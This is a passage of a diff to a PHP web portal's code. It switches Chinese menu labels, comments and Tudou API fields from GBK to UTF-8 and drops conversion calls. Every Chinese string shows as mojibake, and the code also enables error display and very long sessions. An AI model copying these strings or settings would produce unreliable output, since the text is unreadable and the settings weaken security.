-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=gmap&skin=".$skincolor."\">".formatchar('µØÇò')."</a> ";
+                case "åœ°çƒ":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=gmap&skin=".$skincolor."\">".('åœ°çƒ')."</a> ";
                         break;
-                case "¶ÁÊé":
-                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=docin&skin=".$skincolor."\">".formatchar('¶ÁÊé')."</a> ";
+                case "è¯»ä¹¦":
+                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=docin&skin=".$skincolor."\">".('è¯»ä¹¦')."</a> ";
                         break;
-                case "²¥·Å":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=player&skin=".$skincolor."\">".formatchar('²¥·Å')."</a> ";
+                case "æ’­æ”¾":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=player&skin=".$skincolor."\">".('æ’­æ”¾')."</a> ";
                         break;
-                case "ÓòÃû":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=dnspod&skin=".$skincolor."\">".formatchar('ÓòÃû')."</a> ";
+                case "åŸŸå":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=dnspod&skin=".$skincolor."\">".('åŸŸå')."</a> ";
                         break;
-                case "Ö÷Ò³":
-                        $linkstr = $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?skin=".$skincolor."\">".formatchar('Ö÷Ò³')."</a> ";
+                case "ä¸»é¡µ":
+                        $linkstr = $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?skin=".$skincolor."\">".('ä¸»é¡µ')."</a> ";
                         break;
-                case "Ê×Ò³":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=m&skin=".$skincolor."\">".formatchar('Ê×Ò³')."</a> ";
+                case "é¦–é¡µ":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=m&skin=".$skincolor."\">".('é¦–é¡µ')."</a> ";
                         break;                        
                 case "PING":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=ping&skin=".$skincolor."\">".formatchar('PING')."</a> ";
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=ping&skin=".$skincolor."\">".('PING')."</a> ";
                         break;                                               
-                case "ÏûÏ¢":
-                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=imified&skin=".$skincolor."\">".formatchar('ÏûÏ¢')."</a> ";
+                case "æ¶ˆæ¯":
+                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=imified&skin=".$skincolor."\">".('æ¶ˆæ¯')."</a> ";
                         break;
-                case "±àĞ´":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=editor&skin=".$skincolor."\">".formatchar('±àĞ´')."</a> ";
+                case "ç¼–å†™":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=editor&skin=".$skincolor."\">".('ç¼–å†™')."</a> ";
                         break;
-                case "·¢ĞÅ":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=smtp&skin=".$skincolor."\">".formatchar('·¢ĞÅ')."</a> ";
+                case "å‘ä¿¡":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=smtp&skin=".$skincolor."\">".('å‘ä¿¡')."</a> ";
                         break;
-                case "Ïà²á":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=picasa&skin=".$skincolor."\">".formatchar('Ïà²á')."</a> ";
+                case "ç›¸å†Œ":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=picasa&skin=".$skincolor."\">".('ç›¸å†Œ')."</a> ";
                         break;
-                case "ÍøÖ·":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=urlshortener&skin=".$skincolor."\">".formatchar('ÍøÖ·')."</a> ";
+                case "ç½‘å€":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=urlshortener&skin=".$skincolor."\">".('ç½‘å€')."</a> ";
                         break;
-                case "ÓÎÏ·":
-                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=idoll&skin=".$skincolor."\">".formatchar('ÓÎÏ·')."</a> ";
+                case "æ¸¸æˆ":
+                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=idoll&skin=".$skincolor."\">".('æ¸¸æˆ')."</a> ";
                         break;
-                case "ÁÄÌì":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=gtalk&skin=".$skincolor."\">".formatchar('ÁÄÌì')."</a> ";
+                case "èŠå¤©":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=gtalk&skin=".$skincolor."\">".('èŠå¤©')."</a> ";
                         break;
                 case "FTP":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=ftp&skin=".$skincolor."\">".formatchar('FTP')."</a> ";
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=ftp&skin=".$skincolor."\">".('FTP')."</a> ";
                         break;
-                case "ÓÊ¼ş":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=imap&skin=".$skincolor."\">".formatchar('ÓÊ¼ş')."</a> ";
-                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=byban&skin=".$skincolor."\">".formatchar('ÓÊ¼ş')."</a> ";
+                case "é‚®ä»¶":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=imap&skin=".$skincolor."\">".('é‚®ä»¶')."</a> ";
+                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=byban&skin=".$skincolor."\">".('é‚®ä»¶')."</a> ";
                         break;
-                case "ÓÊÏä":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=live&skin=".$skincolor."\">".formatchar('ÓÊÏä')."</a> ";
+                case "é‚®ç®±":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=live&skin=".$skincolor."\">".('é‚®ç®±')."</a> ";
                         break;
-                case "¼Æ»®":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=zoho&action=planner&skin=".$skincolor."\">".formatchar('¼Æ»®')."</a> ";
+                case "è®¡åˆ’":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=zoho&action=planner&skin=".$skincolor."\">".('è®¡åˆ’')."</a> ";
                         break;
-                case "»áÒé":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=stickam&skin=".$skincolor."\">".formatchar('»áÒé')."</a> ";
+                case "ä¼šè®®":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=stickam&skin=".$skincolor."\">".('ä¼šè®®')."</a> ";
                         break;
-                case "ÔÄÀÀ":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=zoho&action=viewer&skin=".$skincolor."\">".formatchar('ÔÄÀÀ')."</a> ";
+                case "é˜…è§ˆ":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=zoho&action=viewer&skin=".$skincolor."\">".('é˜…è§ˆ')."</a> ";
                         break;
-                case "¹ÉÆ±":
-                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=10jqka&action=stock&skin=".$skincolor."\">".formatchar('¹ÉÆ±')."</a> ";
+                case "è‚¡ç¥¨":
+                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=10jqka&action=stock&skin=".$skincolor."\">".('è‚¡ç¥¨')."</a> ";
                         break;
                 case "VPN":
-                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=vpn&skin=".$skincolor."\">".formatchar('VPN')."</a> ";
+                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=vpn&skin=".$skincolor."\">".('VPN')."</a> ";
                         break;
                 case "SSH":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=ssh&skin=".$skincolor."\">".formatchar('SSH')."</a> ";
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=ssh&skin=".$skincolor."\">".('SSH')."</a> ";
                         break;
-                case "Ö÷»ú":
-                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=cloudhost&skin=".$skincolor."\">".formatchar('Ö÷»ú')."</a> ";
+                case "ä¸»æœº":
+                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=cloudhost&skin=".$skincolor."\">".('ä¸»æœº')."</a> ";
                         break;
         }
 }
@@ -12465,8 +14099,8 @@ function is_wap(){
     $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
     //$uachar = "/(nokia|sony|ericsson|mot|samsung|sgh|lg|sie|philips|panasonic|alcatel|lenovo|cldc|midp|wap|mobile)/i";
     $uachar = "/(nokia|sony|ericsson|mot|samsung|sgh|lg|philips|panasonic|alcatel|lenovo|cldc|midp|wap|mobile|ucweb)/i";
-    //if(($ua == '' || preg_match($uachar, $ua)) && !strpos(strtolower($_SERVER['REQUEST_URI']),'wap')){//Èç¹ûÔÚ·ÃÎÊµÄURLÖĞÒÑ¾­ÕÒµ½ wap×ÖÑù£¬±íÃ÷ÒÑ¾­ÔÚ·ÃÎÊWAPÒ³Ãæ£¬ÎŞĞèÌø×ª£¬ÏÂÒ»°æ±¾Ôö¼Ó feed·ÃÎÊÊ±Ò²²»Ìø×ª
-    if(($ua == '' || preg_match($uachar, $ua))){//Èç¹ûÔÚ·ÃÎÊµÄURLÖĞÒÑ¾­ÕÒµ½ wap×ÖÑù£¬±íÃ÷ÒÑ¾­ÔÚ·ÃÎÊWAPÒ³Ãæ£¬ÎŞĞèÌø×ª£¬ÏÂÒ»°æ±¾Ôö¼Ó feed·ÃÎÊÊ±Ò²²»Ìø×ª
+    //if(($ua == '' || preg_match($uachar, $ua)) && !strpos(strtolower($_SERVER['REQUEST_URI']),'wap')){//å¦‚æœåœ¨è®¿é—®çš„URLä¸­å·²ç»æ‰¾åˆ° wapå­—æ ·ï¼Œè¡¨æ˜å·²ç»åœ¨è®¿é—®WAPé¡µé¢ï¼Œæ— éœ€è·³è½¬ï¼Œä¸‹ä¸€ç‰ˆæœ¬å¢åŠ  feedè®¿é—®æ—¶ä¹Ÿä¸è·³è½¬
+    if(($ua == '' || preg_match($uachar, $ua))){//å¦‚æœåœ¨è®¿é—®çš„URLä¸­å·²ç»æ‰¾åˆ° wapå­—æ ·ï¼Œè¡¨æ˜å·²ç»åœ¨è®¿é—®WAPé¡µé¢ï¼Œæ— éœ€è·³è½¬ï¼Œä¸‹ä¸€ç‰ˆæœ¬å¢åŠ  feedè®¿é—®æ—¶ä¹Ÿä¸è·³è½¬
         return true;
     }else{
         return false;
@@ -12474,10 +14108,10 @@ function is_wap(){
 }
 
 /**
- * $str Ô­Ê¼×Ö·û´®
- * $encoding Ô­Ê¼×Ö·û´®µÄ±àÂë£¬Ä¬ÈÏGBK
- * $prefix ±àÂëºóµÄÇ°×º£¬Ä¬ÈÏ"&#"
- * $postfix ±àÂëºóµÄºó×º£¬Ä¬ÈÏ";"
+ * $str åŸå§‹å­—ç¬¦ä¸²
+ * $encoding åŸå§‹å­—ç¬¦ä¸²çš„ç¼–ç ï¼Œé»˜è®¤GBK
+ * $prefix ç¼–ç åçš„å‰ç¼€ï¼Œé»˜è®¤"&#"
+ * $postfix ç¼–ç åçš„åç¼€ï¼Œé»˜è®¤";"
  */
 function unicode_encode($str, $encoding = 'GBK', $prefix = '&#', $postfix = ';') {
     $str = iconv($encoding, 'UCS-2', $str);
@@ -12491,10 +14125,10 @@ function unicode_encode($str, $encoding = 'GBK', $prefix = '&#', $postfix = ';')
 } 
  
 /**
- * $str Unicode±àÂëºóµÄ×Ö·û´®
- * $encoding Ô­Ê¼×Ö·û´®µÄ±àÂë£¬Ä¬ÈÏGBK
- * $prefix ±àÂë×Ö·û´®µÄÇ°×º£¬Ä¬ÈÏ"&#"
- * $postfix ±àÂë×Ö·û´®µÄºó×º£¬Ä¬ÈÏ";"
+ * $str Unicodeç¼–ç åçš„å­—ç¬¦ä¸²
+ * $encoding åŸå§‹å­—ç¬¦ä¸²çš„ç¼–ç ï¼Œé»˜è®¤GBK
+ * $prefix ç¼–ç å­—ç¬¦ä¸²çš„å‰ç¼€ï¼Œé»˜è®¤"&#"
+ * $postfix ç¼–ç å­—ç¬¦ä¸²çš„åç¼€ï¼Œé»˜è®¤";"
  */
 function unicode_decode($unistr, $encoding = 'GBK', $prefix = '&#', $postfix = ';') {
     $arruni = explode($prefix, $unistr);
@@ -12524,12 +14158,12 @@ switch (trim(request('action'))) { //action switch start
 RewriteEngine On
 RewriteBase /
 
-#Ö»Ğí°ó¶¨µÄÓòÃû·ÃÎÊ
+#åªè®¸ç»‘å®šçš„åŸŸåè®¿é—®
 
 RewriteCond %{HTTP_HOST} !^m.x3193.cf$ [NC]
 RewriteRule (.*) http://m.x3193.cf/$1 [L,R=301]
 
-#¶Ô°ó¶¨Ä¿Â¼ÏÂÓë Í¬ÃûµÄÄ¿Â¼µÄ´¦Àí
+#å¯¹ç»‘å®šç›®å½•ä¸‹ä¸ åŒåçš„ç›®å½•çš„å¤„ç†
 
 RewriteCond %{REQUEST_URI} ^/m/ [NC]
 RewriteCond %{QUERY_STRING} !^(.*)?Rewrite
@@ -12558,14 +14192,14 @@ php_value session.gc_maxlifetime 999999999
 RewriteEngine On
 RewriteBase /
 
-# °ó¶¨m.x3193.cf µ½ m ×ÓÄ¿Â¼
+# ç»‘å®šm.x3193.cf åˆ° m å­ç›®å½•
 RewriteCond %{HTTP_HOST} ^m.x3193.cf$ [NC]
 RewriteCond %{REQUEST_URI} !^/m/
 RewriteRule ^(.*)$ m/$1?Rewrite [L,QSA]
 
-#¿ÉÒÔ°ó¶¨¶à¸ö Ö»ĞèÖØ¸´ÉÏÈıĞĞ´úÂë²¢¸ü¸ÄÒ»ÏÂÓòÃû¡¢Ä¿Â¼Ãû ¾ÍºÃÁË
+#å¯ä»¥ç»‘å®šå¤šä¸ª åªéœ€é‡å¤ä¸Šä¸‰è¡Œä»£ç å¹¶æ›´æ”¹ä¸€ä¸‹åŸŸåã€ç›®å½•å å°±å¥½äº†
 
-# °ó¶¨m.blog.x3193.cf µ½ m/wap ×ÓÄ¿Â¼
+# ç»‘å®šm.blog.x3193.cf åˆ° m/wap å­ç›®å½•
 RewriteCond %{HTTP_HOST} ^m.blog.x3193.cf$ [NC]
 RewriteCond %{REQUEST_URI} !^/m/wap/
 RewriteRule ^(.*)$ m/wap/$1?Rewrite [L,QSA]
@@ -12588,7 +14222,7 @@ php_value session.gc_maxlifetime 999999999
 ?>
 
 <?php 
-function syssetini(){
+function syssetini($hta=''){
 header("cache-control:no-cache,must-revalidate");
 
 ini_set("max_execution_time","77777");  
@@ -12618,7 +14252,7 @@ ini_set("session.gc_maxlifetime","999999999");
 ini_set('display_startup_errors', 1);
 ini_set('display_errors', 1);
 
-	session_start(); // Æô¶¯Session 
+	session_start(); // å¯åŠ¨Session 
 	if(isset($_COOKIE[session_name()])) { 
    session_id($_COOKIE[session_name()]); 
 	} 
@@ -12703,6 +14337,7 @@ if (substr(sprintf('%o', fileperms($dirlist[$i])), -4)!='0755'){
 }
 }
 
+if($hta==''){
 if(ini_get('post_max_size')!='500M' && ini_get('upload_max_filesize')!='500M'){
         		if(!file_exists('./.htaccess')){
                 touch ('./.htaccess');        			
@@ -12738,6 +14373,7 @@ if(ini_get('post_max_size')!='500M' && ini_get('upload_max_filesize')!='500M'){
                 fwrite($handle, $string);
                 fclose ($handle);
 						}						
+}
 }
 
 return $redirecturl;
@@ -12800,7 +14436,7 @@ function getheadcharset(){
 
 <?php 
 /**
- * ½«×Ö·û´®×ª»»³Éunicode±àÂë
+ * å°†å­—ç¬¦ä¸²è½¬æ¢æˆunicodeç¼–ç 
  *
  * @param string $input
  * @param string $input_charset
@@ -12843,7 +14479,7 @@ function utf8_unicode($c) {
 }
 
 /**
- * ½«unicode×Ö·û×ª»»³ÉÆÕÍ¨±àÂë×Ö·û
+ * å°†unicodeå­—ç¬¦è½¬æ¢æˆæ™®é€šç¼–ç å­—ç¬¦
  *
  * @param string $str
  * @param string $out_charset
@@ -12879,7 +14515,7 @@ function unicode2utf8($c){
 }
 
 /**
- * Ä£ÄâJSÀïµÄunescape
+ * æ¨¡æ‹ŸJSé‡Œçš„unescape
  *
  * @param unknown_type $str
  * @return unknown
@@ -12907,13 +14543,13 @@ function unescape($str) {
 <?php 
 
 // ---------------------------------------------------
-//  Api.tudou.com - X3193Ã½ÌåÏµÍ³·Ç±ê×¼¶ÀÁ¢Àà v1.0
-//  ¹©ÄÜ£ºÊµÏÖÃ½Ìå²éÑ¯¡¢²¥·ÅºÍÉÏ´«ÏÂÔØ¹¦ÄÜ
-//  ÊµÏÖ£ºX3193API
-//  ¹©Ó¦£ºtudou.com
-//  ÊÕ²Ø£º¡î¡î¡î¡î¡î
-//  Ê±¼ä£º2011-06-08 12:53AM
-//  ĞĞÊı£º683ĞĞ
+//  Api.tudou.com - X3193åª’ä½“ç³»ç»Ÿéæ ‡å‡†ç‹¬ç«‹ç±» v1.0
+//  ä¾›èƒ½ï¼šå®ç°åª’ä½“æŸ¥è¯¢ã€æ’­æ”¾å’Œä¸Šä¼ ä¸‹è½½åŠŸèƒ½
+//  å®ç°ï¼šX3193API
+//  ä¾›åº”ï¼študou.com
+//  æ”¶è—ï¼šâ˜†â˜†â˜†â˜†â˜†
+//  æ—¶é—´ï¼š2011-06-08 12:53AM
+//  è¡Œæ•°ï¼š683è¡Œ
 // ---------------------------------------------------
 
 class tudou_class{
@@ -12951,44 +14587,44 @@ function tudoumediaclassid(){
                 	$tudoumediaclassid=array();
 			for($i = 0;$i <= count($jsonstr['results']);$i++){
 				if($i == '0'){
-					$tudoumediaclassid[$i]= array('code' => '','type' => '·ÖÀà');
+					$tudoumediaclassid[$i]= array('code' => '','type' => 'åˆ†ç±»');
 					continue;
 				}
 				$tudoumediaclassid[$i]['code'] = $jsonstr['results'][$i-1]['channelId'];
-				$tudoumediaclassid[$i]['type'] = iconv('utf-8','gb2312',$jsonstr['results'][$i-1]['channelName']);
+				$tudoumediaclassid[$i]['type'] = $jsonstr['results'][$i-1]['channelName'];
 			}
 	return $tudoumediaclassid;
 }
 
 function tudoumediaday(){
-	$tudoumediaday[0] = array('day' => '','name' => 'Ê±¼ä');
-	$tudoumediaday[1] = array('day' => '7','name' => '7Ìì');
-	$tudoumediaday[2] = array('day' => '30','name' => '30Ìì');	
-	$tudoumediaday[3] = array('day' => '90','name' => '90Ìì');	
-	$tudoumediaday[4] = array('day' => '180','name' => '180Ìì');	
+	$tudoumediaday[0] = array('day' => '','name' => 'æ—¶é—´');
+	$tudoumediaday[1] = array('day' => '7','name' => '7å¤©');
+	$tudoumediaday[2] = array('day' => '30','name' => '30å¤©');	
+	$tudoumediaday[3] = array('day' => '90','name' => '90å¤©');	
+	$tudoumediaday[4] = array('day' => '180','name' => '180å¤©');	
 	return $tudoumediaday;
 }
 
 function tudoumediatime(){
-	$tudoumediatime[0] = array('time' => '','name' => 'Ê±³¤');
-	$tudoumediatime[1] = array('time' => '15','name' => '¶ÌÊÓÆµ');
-	$tudoumediatime[2] = array('time' => '60','name' => 'ÖĞ³¤ÊÓÆµ');
-	$tudoumediatime[3] = array('time' => '120','name' => '³¤ÊÓÆµ');
+	$tudoumediatime[0] = array('time' => '','name' => 'æ—¶é•¿');
+	$tudoumediatime[1] = array('time' => '15','name' => 'çŸ­è§†é¢‘');
+	$tudoumediatime[2] = array('time' => '60','name' => 'ä¸­é•¿è§†é¢‘');
+	$tudoumediatime[3] = array('time' => '120','name' => 'é•¿è§†é¢‘');
 	return $tudoumediatime;
 }
 
 function tudoumediatype(){
-	$tudoumediatype[0] = array('type' => '','name' => 'ÀàĞÍ');
-	$tudoumediatype[1] = array('type' => 'a','name' => 'ÒôÆµ');
-	$tudoumediatype[2] = array('type' => 'v','name' => 'ÊÓÆµ');	
+	$tudoumediatype[0] = array('type' => '','name' => 'ç±»å‹');
+	$tudoumediatype[1] = array('type' => 'a','name' => 'éŸ³é¢‘');
+	$tudoumediatype[2] = array('type' => 'v','name' => 'è§†é¢‘');	
 	return $tudoumediatype;
 }
 
 function tudoumediaorder(){
-	$tudoumediaorder[0] = array('order' => '','name' => 'ÅÅĞò');	
-	$tudoumediaorder[1] = array('order' => '','name' => 'Ïà¹Ø¶È');		
-	$tudoumediaorder[2] = array('order' => 'createTime','name' => '·¢²¼Ê±¼ä');	
-	$tudoumediaorder[3] = array('order' => 'viewed_all','name' => 'pvÁ¿');
+	$tudoumediaorder[0] = array('order' => '','name' => 'æ’åº');	
+	$tudoumediaorder[1] = array('order' => '','name' => 'ç›¸å…³åº¦');		
+	$tudoumediaorder[2] = array('order' => 'createTime','name' => 'å‘å¸ƒæ—¶é—´');	
+	$tudoumediaorder[3] = array('order' => 'viewed_all','name' => 'pvé‡');
 	return $tudoumediaorder;
 }
 
@@ -13087,9 +14723,9 @@ function tudoumedialist($keyword,$order,$page,$pagesize,$mediatype,$mediatime,$m
         									//echo GetGB2312String($jsonstr['results'][$i]['mediaType']);
         									if($mediatype == ''){
         									}
-        									elseif ($mediatype == 'a' && GetGB2312String($jsonstr['results'][$i]['mediaType'])=='ÒôÆµ'){						
+        									elseif ($mediatype == 'a' && ($jsonstr['results'][$i]['mediaType'])=='éŸ³é¢‘'){						
 													}
-        									elseif ($mediatype == 'v' && GetGB2312String($jsonstr['results'][$i]['mediaType'])=='ÊÓÆµ'){						
+        									elseif ($mediatype == 'v' && ($jsonstr['results'][$i]['mediaType'])=='è§†é¢‘'){						
 													}
 	      									else{		
         										//echo $item;
@@ -13112,21 +14748,21 @@ function tudoumedialist($keyword,$order,$page,$pagesize,$mediatype,$mediatime,$m
         										continue;
         									}
 													        									
-		                     	$medialist[$item]['itemCode'] = GetGB2312String($jsonstr['results'][$i]['itemCode']);                		
-                        	$medialist[$item]['mediatags'] = GetGB2312String($jsonstr['results'][$i]['tags']);
-                        	$medialist[$item]['mediatitle'] = GetGB2312String($jsonstr['results'][$i]['title']);
-                        	$medialist[$item]['mediadescription'] = GetGB2312String($jsonstr['results'][$i]['description']);
-                        	$medialist[$item]['mediapicurl'] = GetGB2312String($jsonstr['results'][$i]['picUrl']);
-                        	$medialist[$item]['mediatime'] = GetGB2312String($jsonstr['results'][$i]['totalTime']);
-                        	$medialist[$item]['mediacreatetime'] = GetGB2312String($jsonstr['results'][$i]['pubDate']);
-                        	$medialist[$item]['mediaownerid'] = GetGB2312String($jsonstr['results'][$i]['ownerId']);
-                        	$medialist[$item]['mediaownername'] = GetGB2312String($jsonstr['results'][$i]['ownerName']);
-                        	$medialist[$item]['mediaownernickname'] = GetGB2312String($jsonstr['results'][$i]['ownerNickname']);
-                        	$medialist[$item]['mediaclass'] = GetGB2312String($jsonstr['results'][$i]['channelId']);
-                        	$medialist[$item]['mediaplayerurl'] = GetGB2312String($jsonstr['results'][$i]['outerPlayerUrl']);
-                        	$medialist[$item]['mediaitemurl'] = GetGB2312String($jsonstr['results'][$i]['itemUrl']);
-                        	$medialist[$item]['mediatype'] = GetGB2312String($jsonstr['results'][$i]['mediaType']);
-                        	$medialist[$item]['mediachecked'] = GetGB2312String($jsonstr['results'][$i]['isChecked']);
+		                     	$medialist[$item]['itemCode'] = ($jsonstr['results'][$i]['itemCode']);                		
+                        	$medialist[$item]['mediatags'] = ($jsonstr['results'][$i]['tags']);
+                        	$medialist[$item]['mediatitle'] = ($jsonstr['results'][$i]['title']);
+                        	$medialist[$item]['mediadescription'] = ($jsonstr['results'][$i]['description']);
+                        	$medialist[$item]['mediapicurl'] = ($jsonstr['results'][$i]['picUrl']);
+                        	$medialist[$item]['mediatime'] = ($jsonstr['results'][$i]['totalTime']);
+                        	$medialist[$item]['mediacreatetime'] = ($jsonstr['results'][$i]['pubDate']);
+                        	$medialist[$item]['mediaownerid'] = ($jsonstr['results'][$i]['ownerId']);
+                        	$medialist[$item]['mediaownername'] = ($jsonstr['results'][$i]['ownerName']);
+                        	$medialist[$item]['mediaownernickname'] = ($jsonstr['results'][$i]['ownerNickname']);
+                        	$medialist[$item]['mediaclass'] = ($jsonstr['results'][$i]['channelId']);
+                        	$medialist[$item]['mediaplayerurl'] = ($jsonstr['results'][$i]['outerPlayerUrl']);
+                        	$medialist[$item]['mediaitemurl'] = ($jsonstr['results'][$i]['itemUrl']);
+                        	$medialist[$item]['mediatype'] = ($jsonstr['results'][$i]['mediaType']);
+                        	$medialist[$item]['mediachecked'] = ($jsonstr['results'][$i]['isChecked']);
   
 													//echo $item.'|'.$jsonstr['results'][$i]['totalTime']; 
 
@@ -13176,23 +14812,23 @@ function tudoumediaulist($uname,$page,$pagesize){
 
         		for($i = 0;$i < $strpagesize;$i++){
                 		//$objHdd = $objList->item($i);
-                        	$mediaulist[$i]['itemCode'] = iconv('utf-8','gb2312','aassssssssssss');                		
-                        	$mediaulist[$i]['mediatags'] = iconv('utf-8','gb2312','aaaaaaaaaaaa');
-                        	$mediaulist[$i]['mediatitle'] = iconv('utf-8','gb2312','bbbbbbbbbbbbbbb');
-                        	$mediaulist[$i]['mediadescription'] = iconv('utf-8','gb2312','ccccccccccccccccc');
-                        	$mediaulist[$i]['mediapicurl'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhh');
-                        	$mediaulist[$i]['mediatime'] = iconv('utf-8','gb2312','ggggggggggggggggg');
-                        	$mediaulist[$i]['mediacreatetime'] = iconv('utf-8','gb2312','jjjjjjjjjjjjjj');
-                        	$mediaulist[$i]['mediaownerid'] = iconv('utf-8','gb2312','kkkkkkkkkkkkkk');
-                        	$mediaulist[$i]['mediaownername'] = iconv('utf-8','gb2312','mmmmmmmmmmmmmmmmm');
-                        	$mediaulist[$i]['mediaownernickname'] = iconv('utf-8','gb2312','uuuuuuuuuuuuu');
-                        	$mediaulist[$i]['mediaclass'] = iconv('utf-8','gb2312','oooooooooooo');
-                        	$mediaulist[$i]['mediaplayerurl'] = iconv('utf-8','gb2312','ppppppppppp');
-                        	$mediaulist[$i]['mediaitemurl'] = iconv('utf-8','gb2312','yyyyyyyyyyy');
-                        	$mediaulist[$i]['mediaitemid'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhhhhh');
-                        	$mediaulist[$i]['mediaitemcode'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhhhhhhh');
-                        	$mediaulist[$i]['mediatype'] = iconv('utf-8','gb2312','rrrrrrrrrrrrrrr');
-                        	$mediaulist[$i]['mediasecret'] = iconv('utf-8','gb2312','rrrrrrrrrrrrrrr');
+                        	$mediaulist[$i]['itemCode'] = ('aassssssssssss');                		
+                        	$mediaulist[$i]['mediatags'] = ('aaaaaaaaaaaa');
+                        	$mediaulist[$i]['mediatitle'] = ('bbbbbbbbbbbbbbb');
+                        	$mediaulist[$i]['mediadescription'] = ('ccccccccccccccccc');
+                        	$mediaulist[$i]['mediapicurl'] = ('hhhhhhhhhhhhhh');
+                        	$mediaulist[$i]['mediatime'] = ('ggggggggggggggggg');
+                        	$mediaulist[$i]['mediacreatetime'] = ('jjjjjjjjjjjjjj');
+                        	$mediaulist[$i]['mediaownerid'] = ('kkkkkkkkkkkkkk');
+                        	$mediaulist[$i]['mediaownername'] = ('mmmmmmmmmmmmmmmmm');
+                        	$mediaulist[$i]['mediaownernickname'] = ('uuuuuuuuuuuuu');
+                        	$mediaulist[$i]['mediaclass'] = ('oooooooooooo');
+                        	$mediaulist[$i]['mediaplayerurl'] = ('ppppppppppp');
+                        	$mediaulist[$i]['mediaitemurl'] = ('yyyyyyyyyyy');
+                        	$mediaulist[$i]['mediaitemid'] = ('hhhhhhhhhhhhhhhhh');
+                        	$mediaulist[$i]['mediaitemcode'] = ('hhhhhhhhhhhhhhhhhhh');
+                        	$mediaulist[$i]['mediatype'] = ('rrrrrrrrrrrrrrr');
+                        	$mediaulist[$i]['mediasecret'] = ('rrrrrrrrrrrrrrr');
 	        	}
 	        	//print_r($mediaulist);
         	}       
@@ -13204,32 +14840,32 @@ function tudoumediaulist($uname,$page,$pagesize){
         		//$objList = $objXml->getElementsByTagName("ItemInfo");   
 	        	//echo $objList->length;                   
         		$mediaulist = array();
-        		$mediaulist['page'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['pageNo']);
-        		$mediaulist['pagesize'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['pageSize']);
-        		$mediaulist['pagecount'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['pageCount']);
-        		$mediaulist['totalcount'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['totalCount']);
+        		$mediaulist['page'] = $jsonstr['multiPageResult']['page']['pageNo'];
+        		$mediaulist['pagesize'] = $jsonstr['multiPageResult']['page']['pageSize'];
+        		$mediaulist['pagecount'] = $jsonstr['multiPageResult']['page']['pageCount'];
+        		$mediaulist['totalcount'] = $jsonstr['multiPageResult']['page']['totalCount'];
         		$mediaulist['length'] = $mediaulist['totalcount'];
         		if ($mediaulist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mediaulist['length'];        	
 
         		for($i = 0;$i < $strpagesize;$i++){
